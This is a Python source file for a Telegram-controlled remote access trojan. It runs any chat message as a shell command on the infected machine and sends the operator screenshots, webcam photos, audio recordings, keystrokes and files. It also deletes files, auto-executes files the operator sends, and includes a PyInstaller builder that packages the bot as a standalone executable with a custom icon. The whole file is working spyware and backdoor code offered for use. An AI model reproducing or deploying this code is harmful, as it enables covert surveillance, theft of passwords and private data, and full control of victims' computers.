# setup.py
import os
import shutil
import subprocess
import threading
import time
import telebot
import sys

# ================= Optional GUI modules =================
HAS_PYAUTO = HAS_CV2 = False

try:
    if os.environ.get("DISPLAY", "") != "":
        import pyautogui
        HAS_PYAUTO = True
except Exception:
    HAS_PYAUTO = False

try:
    if os.environ.get("DISPLAY", "") != "":
        import cv2
        HAS_CV2 = True
except Exception:
    HAS_CV2 = False

# Audio
HAS_AUDIO = False
try:
    import sounddevice as sd
    import wavio
    HAS_AUDIO = True
except Exception:
    pass

# Keylogger
HAS_KEYLOGGER = False
try:
    from pynput import keyboard
    HAS_KEYLOGGER = True
except Exception:
    pass

# ================= Keylogger globals =================
keylogger_running = False
key_log = []
keylogger_thread = None

# ================= Current directory tracker =================
CURRENT_DIR = os.getcwd()

# ================= Command mode =================
COMMAND_MODE = True  # agar True → normal text messages shell commands ki tarah run honge

# ================= Bot utility functions =================
def run_command(cmd):
    global CURRENT_DIR
    parts = cmd.strip().split()
    if not parts:
        return "❌ No command provided."

    if parts[0] == "cd":
        try:
            if len(parts) == 1:
                CURRENT_DIR = os.path.expanduser("~")
            else:
                new_dir = os.path.join(CURRENT_DIR, " ".join(parts[1:]))
                os.chdir(new_dir)
                CURRENT_DIR = os.getcwd()
            return f"📂 Current directory: {CURRENT_DIR}"
        except Exception as e:
            return f"❌ cd failed: {e}"

    try:
        output = subprocess.getoutput(f"cd {CURRENT_DIR} && {cmd}")
        return output if output else "Command executed but no output."
    except Exception as e:
        return f"❌ Error: {e}"

def take_screenshot(path="screenshot.png"):
    if HAS_PYAUTO:
        try:
            img = pyautogui.screenshot()
            img.save(path)
            return path
        except Exception:
            pass
    return None

def take_webcam_photo(path="webcam.jpg"):
    if HAS_CV2:
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(path, frame)
                cam.release()
                return path
            cam.release()
        except Exception:
            pass
    return None

def record_audio(seconds, path="record.wav"):
    if HAS_AUDIO:
        try:
            fs = 44100
            recording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
            sd.wait()
            wavio.write(path, recording, fs, sampwidth=2)
            return path
        except Exception:
            pass
    return None

def keylogger_worker(bot, CHAT_ID):
    global keylogger_running, key_log
    def on_press(key):
        try:
            key_log.append(key.char)
        except AttributeError:
            key_log.append(str(key))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while keylogger_running:
        time.sleep(10)
        if key_log:
            text = "".join(key_log)
            bot.send_message(CHAT_ID, f"⌨️ Keylog (last 10s):\n{text}")
            key_log = []
    listener.stop()

# ================= Bot main function =================
def start_bot(BOT_TOKEN, CHAT_ID):
    global keylogger_running, keylogger_thread, CURRENT_DIR, COMMAND_MODE
    bot = telebot.TeleBot(BOT_TOKEN)

    # ===== send online message immediately =====
    try:
        bot.send_message(CHAT_ID, "🚀 TUW Bot is now Online! Type /help")
    except Exception as e:
        print(f"⚠️ Could not send startup message: {e}")

    # ===== Handlers =====
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        bot.send_message(CHAT_ID, "👋 TUW Bot is Online! Type /help to see commands.")

    @bot.message_handler(commands=['help'])
    def handle_help(message):
        help_text = """
📖 TUW Bot Commands:
/start - Start bot
/help - Show commands
/cmd <command> - Optional: Execute command
/screenshot - Take screenshot
/webcam - Take webcam photo
/download <filepath> - Download file
/delete <filepath> - Delete file
/record <seconds> - Record audio
/keylogger start|stop - Start/Stop keylogger

⚡ Command Mode: All normal messages are run as shell commands.
"""
        bot.send_message(CHAT_ID, help_text)

    @bot.message_handler(commands=['cmd'])
    def handle_cmd(message):
        cmd = message.text.replace("/cmd","",1).strip()
        output = run_command(cmd)
        if len(output) > 4000:
            with open("cmd_output.txt","w") as f: f.write(output)
            with open("cmd_output.txt","rb") as f: bot.send_document(CHAT_ID,f)
            os.remove("cmd_output.txt")
        else:
            bot.send_message(CHAT_ID,f"🖥 Output:\n{output}")

    @bot.message_handler(commands=['screenshot'])
    def handle_screenshot_cmd(message):
        path = take_screenshot()
        if path and os.path.exists(path):
            with open(path,"rb") as f: bot.send_photo(CHAT_ID,f)
            os.remove(path)
        else:
            bot.send_message(CHAT_ID,"❌ Screenshot failed.")

    @bot.message_handler(commands=['webcam'])
    def handle_webcam_cmd(message):
        path = take_webcam_photo()
        if path and os.path.exists(path):
            with open(path,"rb") as f: bot.send_photo(CHAT_ID,f)
            os.remove(path)
        else:
            bot.send_message(CHAT_ID,"❌ Webcam capture failed.")

    @bot.message_handler(commands=['download'])
    def handle_download(message):
        path = message.text.replace("/download","",1).strip()
        if path and os.path.exists(path):
            with open(path,"rb") as f: bot.send_document(CHAT_ID,f)
        else:
            bot.send_message(CHAT_ID,"❌ File not found.")

    @bot.message_handler(commands=['delete'])
    def handle_delete(message):
        path = message.text.replace("/delete","",1).strip()
        if path and os.path.exists(path):
            try:
                os.remove(path)
                bot.send_message(CHAT_ID,f"🗑️ Deleted: {path}")
            except Exception as e:
                bot.send_message(CHAT_ID,f"⚠️ Error deleting file:\n{str(e)}")
        else:
            bot.send_message(CHAT_ID,"❌ File not found.")

    @bot.message_handler(commands=['record'])
    def handle_record(message):
        try:
            sec = int(message.text.replace("/record","",1).strip())
            bot.send_message(CHAT_ID,f"🎤 Recording {sec} seconds...")
            path = record_audio(sec)
            if path:
                with open(path,"rb") as f: bot.send_document(CHAT_ID,f,caption=f"🎤 Recorded {sec} sec")
                os.remove(path)
            else:
                bot.send_message(CHAT_ID,"❌ Audio recording failed.")
        except Exception:
            bot.send_message(CHAT_ID,"❌ Usage: /record <seconds>")

    @bot.message_handler(commands=['keylogger'])
    def handle_keylogger(message):
        global keylogger_running, keylogger_thread
        args = message.text.split()
        if len(args)<2:
            bot.reply_to(message,"⚠️ Usage: /keylogger start | stop")
            return
        if args[1].lower()=="start":
            if HAS_KEYLOGGER and not keylogger_running:
                keylogger_running=True
                keylogger_thread = threading.Thread(target=keylogger_worker, args=(bot, CHAT_ID), daemon=True)
                keylogger_thread.start()
                bot.send_message(CHAT_ID,"✅ Keylogger started. Logging every 10s...")
            else:
                bot.send_message(CHAT_ID,"⚠️ Keylogger already running or unavailable.")
        elif args[1].lower()=="stop":
            if keylogger_running:
                keylogger_running=False
                bot.send_message(CHAT_ID,"🛑 Keylogger stopped.")
            else:
                bot.send_message(CHAT_ID,"⚠️ Keylogger not running.")

    # ===== Auto-run received files =====
    @bot.message_handler(content_types=['document','photo'])
    def handle_files(message):
        try:
            if message.document:
                file_id = message.document.file_id
                info = bot.get_file(file_id)
                data = bot.download_file(info.file_path)
                filename = message.document.file_name
                with open(filename,"wb") as f: f.write(data)
                bot.reply_to(message,f"📂 File saved as {filename}")

                # Auto-run
                try:
                    if sys.platform.startswith("win"):
                        subprocess.Popen([filename], shell=True)
                    elif sys.platform.startswith("linux"):
                        subprocess.Popen(["chmod","+x",filename]).wait()
                        subprocess.Popen([f"./{filename}"])
                except Exception as e:
                    bot.reply_to(message,f"⚠️ Auto-run failed: {e}")

            elif message.photo:
                file_id = message.photo[-1].file_id
                info = bot.get_file(file_id)
                data = bot.download_file(info.file_path)
                name = f"photo_{int(time.time())}.jpg"
                with open(name,"wb") as f: f.write(data)
                bot.reply_to(message,f"🖼️ Photo saved as {name}")
        except Exception as e:
            bot.reply_to(message,f"⚠️ Error saving file:\n{str(e)}")

    # ===== Handle normal text messages as shell commands =====
    @bot.message_handler(func=lambda m: True)
    def handle_normal_message(message):
        global COMMAND_MODE
        if COMMAND_MODE:
            cmd_text = message.text.strip()
            if cmd_text.startswith("/"):  # ignore bot commands
                return
            output = run_command(cmd_text)
            if len(output) > 4000:
                with open("cmd_output.txt","w") as f: f.write(output)
                with open("cmd_output.txt","rb") as f: bot.send_document(CHAT_ID,f)
                os.remove("cmd_output.txt")
            else:
                bot.send_message(CHAT_ID, f"🖥 Output:\n{output}")

    print("🚀 TUW Bot is now Online!")
    bot.infinity_polling()

# ===================== PyInstaller EXE/BIN creation =====================
def create_exe(BOT_TOKEN, CHAT_ID, icon_path=""):
    script_file = "bot_temp.py"
    with open(script_file, "w") as f:
        f.write(f"""
from setup import start_bot
start_bot("{BOT_TOKEN}", "{CHAT_ID}")
""")
    output_folder = "output"
    os.makedirs(output_folder, exist_ok=True)

    cmd = ["pyinstaller", "--onefile", f"--distpath={output_folder}", script_file]
    if icon_path:
        cmd.append(f"--icon={icon_path}")

    # Note for user
    platform = sys.platform
    if platform.startswith("win"):
        print("⚠️ Windows detected → executable will be .exe")
    elif platform.startswith("linux"):
        print("⚠️ Linux detected → executable will be .bin")
    else:
        print("⚠️ Unknown platform → default output")

    print("⚡ Building executable, please wait...")
    subprocess.run(cmd, check=True)

    # Cleanup
    os.remove(script_file)
    spec_file = script_file.replace(".py", ".spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)
    build_folder = "build"
    if os.path.exists(build_folder):
        shutil.rmtree(build_folder)

    print(f"✅ Build complete! Check '{output_folder}' folder.")
